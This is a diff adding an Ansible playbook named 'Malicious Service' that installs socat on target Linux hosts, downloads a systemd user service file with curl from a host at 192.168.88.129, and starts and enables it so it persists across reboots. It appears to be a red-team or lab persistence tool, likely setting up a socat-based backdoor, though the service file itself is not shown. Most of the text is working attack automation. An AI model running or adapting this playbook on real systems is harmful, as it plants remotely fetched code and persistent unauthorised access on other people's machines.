@@ -1,0 +1,23 @@
+---
+- name: Malicious Service
+  hosts: linuxhosts
+  gather_facts: false
+
+  tasks:
+    
+    - name: Installs dependencies
+      ansible.builtin.apt:
+        name: socat
+      become: true
+
+    - name: Creates the directory for the service
+      shell: mkdir -p ~/.config/systemd/user
+
+    - name: Grabs the service down
+      shell: curl 192.168.88.129:8000/bs.service -o ~/.config/systemd/user/bs.service
+
+    - name: Starts the service
+      shell: systemctl --user start bs.service
+
+    - name: Enables service so it persists
+      shell: systemctl --user enable bs.service
